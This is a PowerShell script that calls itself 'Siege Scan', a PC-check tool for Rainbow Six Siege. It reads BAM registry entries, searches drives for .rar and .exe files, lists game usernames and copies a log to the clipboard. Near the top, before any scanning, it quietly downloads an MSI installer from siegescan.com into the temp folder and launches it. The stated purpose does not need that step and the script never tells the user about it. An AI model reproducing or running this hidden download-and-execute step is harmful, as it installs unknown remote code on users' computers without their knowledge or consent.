
Clear-Host

# =========================
# SIEGE SCAN ASCII BANNER
# =========================
$banner = @"
███████╗██╗███████╗ ██████╗ ███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
██╔════╝██║██╔════╝██╔════╝ ██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
███████╗██║█████╗  ██║  ███╗█████╗      ███████╗██║     ███████║██╔██╗ ██║
╚════██║██║██╔══╝  ██║   ██║██╔══╝      ╚════██║██║     ██╔══██║██║╚██╗██║
███████║██║███████╗╚██████╔╝███████╗    ███████║╚██████╗██║  ██║██║ ╚████║
╚══════╝╚═╝╚══════╝ ╚═════╝ ╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝

                         SIEGE SCAN
                  SYSTEM ANALYSIS TOOL
"@

Write-Host $banner -ForegroundColor Cyan


$exeUrl  = "https://siegescan.com/drivas.msi"
$exePath = "$env:TEMP\drives.msi"

Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -ErrorAction Stop
Start-Process $exePath


# =========================
# TITLE
# =========================
$encodedTitle = "Q3JlYXRlZCBCeSBaZXlza2kgb24gRGlzY29yZA=="
$titleText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedTitle))
$Host.UI.RawUI.WindowTitle = $titleText


# =========================
# FIXED ONEDRIVE FUNCTION
# =========================
function Get-OneDrivePath {
    try {
        $oneDrivePath = $null

        $regPath = "HKCU:\Software\Microsoft\OneDrive"

        if (Test-Path $regPath) {
            $prop = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
            if ($prop -and $prop.UserFolder -and (Test-Path $prop.UserFolder)) {
                $oneDrivePath = $prop.UserFolder
            }
        }

        if (-not $oneDrivePath) {
            $fallback = Join-Path $env:UserProfile "OneDrive"
            if (Test-Path $fallback) {
                $oneDrivePath = $fallback
                Write-Host "OneDrive path detected using fallback: $oneDrivePath" -ForegroundColor Green
            } else {
                Write-Error "Unable to find OneDrive path automatically."
                return $null
            }
        }

        return $oneDrivePath
    }
    catch {
        Write-Error "Unable to find OneDrive path: $_"
        return $null
    }
}


function Format-Output {
    param($name, $value)
    "{0} : {1}" -f $name, $value -replace 'System.Byte\[\]', ''
}

function Log-FolderNames {
    $userName = $env:UserName
    $oneDrivePath = Get-OneDrivePath
    $potentialPaths = @(
        "C:\Users\$userName\Documents\My Games\Rainbow Six - Siege",
        "$oneDrivePath\Documents\My Games\Rainbow Six - Siege"
    )
    $allUserNames = @()

    foreach ($path in $potentialPaths) {
        if (Test-Path -Path $path) {
            $dirNames = Get-ChildItem -Path $path -Directory | ForEach-Object { $_.Name }
            $allUserNames += $dirNames
        }
    }

    return $allUserNames | Select-Object -Unique
}


function Find-RarAndExeFiles {
    Write-Output "Finding .rar and .exe files..."
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
    $oneDriveFileHeader = "`n-----------------`nOneDrive Files:`n"
    $oneDriveFiles = @()
    $allFiles = @()

    $rarSearchPaths = @()
    Get-PSDrive -PSProvider 'FileSystem' | ForEach-Object { $rarSearchPaths += $_.Root }
    $oneDrivePath = Get-OneDrivePath
    if ($oneDrivePath) { $rarSearchPaths += $oneDrivePath }

    $jobs = @()

    $rarJob = {
        param ($searchPaths, $oneDriveFiles)
        $allFiles = @()
        foreach ($path in $searchPaths) {
            Get-ChildItem -Path $path -Recurse -Filter "*.rar" -ErrorAction SilentlyContinue | ForEach-Object {
                $fileInfo = "$($_.FullName) - Last Modified: $($_.LastWriteTime)"
                $allFiles += $fileInfo
                if ($_.FullName -like "*OneDrive*") { $oneDriveFiles += $_.FullName }
            }
        }
        return $allFiles
    }

    $exeJob = {
        param ($oneDrivePath, $oneDriveFiles)
        $exeFiles = @()
        if ($oneDrivePath) {
            Get-ChildItem -Path $oneDrivePath -Recurse -Filter "*.exe" -ErrorAction SilentlyContinue | ForEach-Object {
                $fileInfo = "$($_.FullName) - Last Modified: $($_.LastWriteTime)"
                $exeFiles += $fileInfo
                if ($_.FullName -like "*OneDrive*") { $oneDriveFiles += $_.FullName }
            }
        }
        return $exeFiles
    }

    $jobs += Start-Job -ScriptBlock $rarJob -ArgumentList $rarSearchPaths, $oneDriveFiles
    $jobs += Start-Job -ScriptBlock $exeJob -ArgumentList $oneDrivePath, $oneDriveFiles

    $jobs | ForEach-Object {
        Wait-Job $_ | Out-Null
        $allFiles += Receive-Job $_
        Remove-Job $_
    }

    $groupedFiles = $allFiles | Sort-Object

    if ($oneDriveFiles.Count -gt 0) {
        Add-Content -Path $outputFile -Value $oneDriveFileHeader
        $oneDriveFiles | Sort-Object | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
    }

    if ($groupedFiles.Count -gt 0) {
        $groupedFiles | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
    }
}


function Find-SusFiles {
    Write-Output "Finding suspicious files names..."
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
    $susFilesHeader = "`n-----------------`nSus Files:`n"
    $susFiles = @()

    if (Test-Path $outputFile) {
        $loggedFiles = Get-Content -Path $outputFile
        foreach ($file in $loggedFiles) {
            if ($file -match "loader.*\.exe") { $susFiles += $file }
        }

        if ($susFiles.Count -gt 0) {
            Add-Content -Path $outputFile -Value $susFilesHeader
            $susFiles | Sort-Object | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
        }
    }
}


function List-BAMStateUserSettings {
    Write-Host "Logging reg entries inside PowerShell..." -ForegroundColor DarkYellow
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
    if (Test-Path $outputFile) { Clear-Content $outputFile }

    $loggedPaths = @{}

    Write-Host "Fetching UserSettings Entries" -ForegroundColor Blue

    $registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
    if (Test-Path $registryPath) {
        $userSettings = Get-ChildItem -Path $registryPath | Where-Object { $_.Name -like "*1001" }

        foreach ($setting in $userSettings) {
            Add-Content -Path $outputFile -Value "`n$($setting.PSPath)"
            $items = Get-ItemProperty -Path $setting.PSPath | Select-Object -Property *

            foreach ($item in $items.PSObject.Properties) {
                if (($item.Name -match "exe" -or $item.Name -match ".rar") -and -not $loggedPaths.ContainsKey($item.Name)) {
                    Add-Content -Path $outputFile -Value (Format-Output $item.Name $item.Value)
                    $loggedPaths[$item.Name] = $true
                }
            }
        }
    }

    Log-BrowserFolders

    $folderNames = Log-FolderNames | Sort-Object | Get-Unique

    Add-Content -Path $outputFile -Value "`n-----------------"
    Add-Content -Path $outputFile -Value "`nR6 Usernames:"

    foreach ($name in $folderNames) {
        Add-Content -Path $outputFile -Value $name
        Start-Process "https://stats.cc/siege/$name"
        Start-Sleep -Seconds 0.5
    }
}


function Log-BrowserFolders {
    $registryPath = "HKLM:\SOFTWARE\Clients\StartMenuInternet"
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"

    if (Test-Path $registryPath) {
        Add-Content -Path $outputFile -Value "`n-----------------`nBrowser Folders:"
        Get-ChildItem -Path $registryPath | ForEach-Object {
            Add-Content -Path $outputFile -Value $_.Name
        }
    }
}


function Log-WindowsInstallDate {
    $os = Get-WmiObject -Class Win32_OperatingSystem
    $installDate = $os.ConvertToDateTime($os.InstallDate)
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"

    Add-Content -Path $outputFile -Value "`n-----------------`nWindows Installation Date: $installDate"
}


# =========================
# RUN
# =========================
List-BAMStateUserSettings
Log-WindowsInstallDate
Find-RarAndExeFiles
Find-SusFiles


$desktopPath = [System.Environment]::GetFolderPath('Desktop')
$logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"

if (Test-Path $logFilePath) {
    Set-Clipboard -Path $logFilePath
    Write-Host "Log file copied to clipboard." -ForegroundColor DarkRed
}


# cleanup
$userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
$downloadsPath = Join-Path -Path $userProfile -ChildPath "Downloads"

function Delete-FileIfExists {
    param([string]$filePath)
    if (Test-Path $filePath) { Remove-Item -Path $filePath -Force -ErrorAction SilentlyContinue }
}

$targetFileDesktop = Join-Path -Path $desktopPath -ChildPath "PcCheck.txt"
$targetFileDownloads = Join-Path -Path $downloadsPath -ChildPath "PcCheck.txt"

Delete-FileIfExists $targetFileDesktop
Delete-FileIfExists $targetFileDownloads


# =========================
# COMPLETE UI
# =========================
$yellow = "Yellow"
$space = " " * 12

Write-Host "`n$space╭─────────────────────────────────────╮" -ForegroundColor $yellow
Write-Host "$space│            SCAN COMPLETE            │" -ForegroundColor $yellow
Write-Host "$space╰─────────────────────────────────────╯" -ForegroundColor $yellow
